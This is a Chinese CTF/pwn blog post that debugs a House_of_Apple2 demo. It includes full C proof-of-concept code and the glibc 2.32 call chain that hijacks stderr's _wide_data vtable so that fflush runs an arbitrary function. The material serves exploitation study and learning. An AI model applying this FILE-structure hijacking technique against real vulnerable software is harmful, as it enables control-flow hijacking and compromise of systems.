---
title: House_of_Apple2_Demo调试
author: Aapcer
date: 2023-02-06 19:30:00 +0800
categories: [攻击方式利用, House_of_Apple]
tags: [House_of_Apple, PWN, IO利用]
math: true
mermaid: true
comments: false
---

## 引言

> 即2.31之后hook都给扬了，大佬们选择忘IO的相关函数去进行利用，今天看到又出了个House_of_琴瑟琵琶，想到自己好久没有做IO的题目了，House_of_Apple2也没又进行记录，这里顺带记录下大佬的Demo

## 利用条件

- 已知`heap`地址和`glibc`地址
- 能控制程序执行`IO`操作，包括但不限于：从`main`函数返回、调用`exit`函数、通过`__malloc_assert`触发
- 能控制`_IO_FILE`的`vtable`和`_wide_data`，一般使用`largebin attack`去控制

当然了，也可以不用largebin attack去写值，我记得`tchache`也可以写

## 利用原理

很简单的是，以前打的FSOP是利用的IO_FILE的vtable表，通过伪造的vtable来任意调用我们的函数，但是后面对IO_FILE的vtable表进行了检查，会判断`vtable`的地址是不是在一个合法的区间。如果`vtable`的地址不合法，程序将会异常终止。

但是有意思的是，他对IO_FILE的vtable进行了检查，可是却没有对IO_FILE中的_IO_wide_data结构体的__wide_vtable进行检查，我们就可以搞这个vtable

> 因此，我们可以劫持`IO_FILE`的`vtable`为`_IO_wfile_jumps`，控制`_wide_data`为可控的堆地址空间，进而控制`_wide_data->_wide_vtable`为可控的堆地址空间。控制程序执行`IO`流函数调用，最终调用到`_IO_Wxxxxx`函数即可控制程序的执行流。

## Demo调试

和大佬的不同，我这里要记录一下调试的过程

Libc版本2.32_3

这里改的是stderr的结构体，没去搞其他的，到时候伪造IO_FILE结构体就行

### 源码

```c
#include<stdio.h>
#include<stdlib.h>
#include<stdint.h>
#include<unistd.h>
#include <string.h>
 
void backdoor()
{
    printf("\033[31m[!] Backdoor is called!\n");
    _exit(0);
}
 
void main()
{
    setbuf(stdout, 0);
    setbuf(stdin, 0);
    setbuf(stderr, 0);
 
    char *p1 = calloc(0x200, 1);
    char *p2 = calloc(0x200, 1);
    puts("[*] allocate two 0x200 chunks");
 
    size_t puts_addr = (size_t)&puts;
    printf("[*] puts address: %p\n", (void *)puts_addr);
    size_t libc_base_addr = puts_addr - 0x7ffff7e5ed90 + 0x7ffff7dde000;
    printf("[*] libc base address: %p\n", (void *)libc_base_addr);
 
    size_t _IO_2_1_stderr_addr = libc_base_addr + 0x1e45e0;
    printf("[*] _IO_2_1_stderr_ address: %p\n", (void *)_IO_2_1_stderr_addr);
 
    size_t _IO_wstrn_jumps_addr = libc_base_addr + 0x1e4c80;
    printf("[*] _IO_wstrn_jumps address: %p\n", (void *)_IO_wstrn_jumps_addr);
 
    char *stderr2 = (char *)_IO_2_1_stderr_addr;
    puts("[+] step 1: change stderr->_flags to 0x800");
    *(size_t *)stderr2 = 0x800;
 
    puts("[+] step 2: change stderr->_mode to 1");
    *(size_t *)(stderr2 + 0xc0) = 1;
 
    puts("[+] step 3: change stderr->vtable to _IO_wstrn_jumps-0x20");
    *(size_t *)(stderr2 + 0xd8) = _IO_wstrn_jumps_addr-0x20;
 
    puts("[+] step 4: replace stderr->_wide_data with the allocated chunk p1");
    *(size_t *)(stderr2 + 0xa0) = (size_t)p1;
 
    puts("[+] step 5: set stderr->_wide_data->_wide_vtable with the allocated chunk p2");
    *(size_t *)(p1 + 0xe0) = (size_t)p2;
 
    puts("[+] step 6: set stderr->_wide_data->_wide_vtable->_IO_write_ptr >  stderr->_wide_data->_wide_vtable->_IO_write_base");
    *(size_t *)(p1 + 0x20) = (size_t)1;
 
    puts("[+] step 7: put backdoor at fake _wide_vtable->_overflow");
    *(size_t *)(p2 + 0x18) = (size_t)(&backdoor);
 
    puts("[+] step 8: call fflush(stderr) to trigger backdoor func");
    fflush(stderr);
 
}
```

### 编译，换库

```bash
gcc house_of_apple2_2.32.c -o pwn -g
patchelf --set-interpreter /usr/local/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/ld-2.32.so --set-rpath /usr/local/glibc-all-in-one/libs/2.32-0ubuntu3_amd64/ ./pwn
```

### 相关调用链

```
_IO_wdefault_xsgetn
    __wunderflow
        _IO_switch_to_wget_mode
            _IO_WOVERFLOW
                *(fp->_wide_data->_wide_vtable + 0x18)(fp)
```

### 运行结果

![image-20230206195726266](/post/20230206/image-20230206195726266.png)

### 开始调试

#### 获取Libc基地址，以及相关结构体和vtable表

![image-20230206195913115](/post/20230206/image-20230206195913115.png)

#### 设置相关flag值

![image-20230206200019834](/post/20230206/image-20230206200019834.png)

![image-20230206200127244](/post/20230206/image-20230206200127244.png)

#### 设置__wide_data相关字段

![image-20230206200427956](/post/20230206/image-20230206200427956.png)

> 其实按照道理来讲，这个p2也就是第二个堆块好像也都不用的，其实玩玩全全可以在第一个堆块里面，只要堆块够大，只需要`*(*(p1+0xe0)+0x18)=backdoor`即可

![image-20230206200932795](/post/20230206/image-20230206200932795.png)

![image-20230206200945802](/post/20230206/image-20230206200945802.png)

![image-20230206201032419](/post/20230206/image-20230206201032419.png)

### Flush进入IO_FILE有关操作

进入`_IO_wdefault_xsgetn`

![image-20230206201315524](/post/20230206/image-20230206201315524.png)

中间调用`__wunderflow`是一个宏

调用`_IO_switch_to_wget_mode`

![image-20230206201635988](/post/20230206/image-20230206201635988.png)

[[rax+0xe0]+0x18]=backdoor

调用backdoor

![image-20230206201745638](/post/20230206/image-20230206201745638.png)

## 总结

> 这里只是对House_of_Apple的调用链条进行了一个简单的调试，利用的是`_IO_wdefault_xsgetn`来进行攻击，还有很多IO函数可以进行利用，后面的文章会介绍其他的IO_FILE函数攻击以及对应的IO_FILE如何构造